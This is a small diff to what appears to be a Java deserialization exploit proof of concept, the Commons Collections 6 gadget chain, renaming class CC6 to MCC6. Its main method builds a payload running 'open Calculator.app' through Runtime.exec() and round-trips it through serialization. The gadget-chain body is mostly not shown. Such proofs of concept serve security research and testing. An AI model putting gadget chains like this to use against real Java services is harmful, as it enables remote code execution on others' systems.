@@ -27,7 +27,7 @@ import java.util.HashSet;
                                 java.lang.Runtime.exec()
     by @matthias_kaiser
 */
-public class CC6 implements POC{
+public class MCC6 implements POC{
 
     public Object getPocObject(Object poc) throws Exception{
         HashMap innermap = new HashMap();
@@ -75,7 +75,7 @@ public class CC6 implements POC{
 
     public static void main(String[] args) throws Exception {
         String cmd= "open /System/Applications/Calculator.app";
-        Object poc = new CC6().getPocObject(cmd);
+        Object poc = new MCC6().getPocObject(cmd);
         SerializeUtils.deserialize(SerializeUtils.serialize(poc));
     }
 }
